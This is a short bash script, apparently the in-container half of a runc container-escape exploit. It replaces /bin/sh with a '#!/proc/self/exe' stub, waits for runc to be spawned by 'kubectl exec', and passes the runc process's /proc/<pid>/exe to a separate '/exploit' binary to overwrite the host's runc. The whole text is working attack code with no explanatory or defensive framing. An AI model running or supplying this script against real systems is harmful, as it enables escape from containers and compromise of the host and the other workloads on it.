#!/bin/bash

# When /bin/sh is executed through kubectl exec, runc will be executed so our script can overwrite it
echo '#!/proc/self/exe' > /bin/sh


echo "Waiting for runC to be executed in the container"

while true ; do
  runc_pid=""

  while [ -z "$runc_pid" ] ; do
    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
  done

  /exploit /proc/${runc_pid}/exe
done
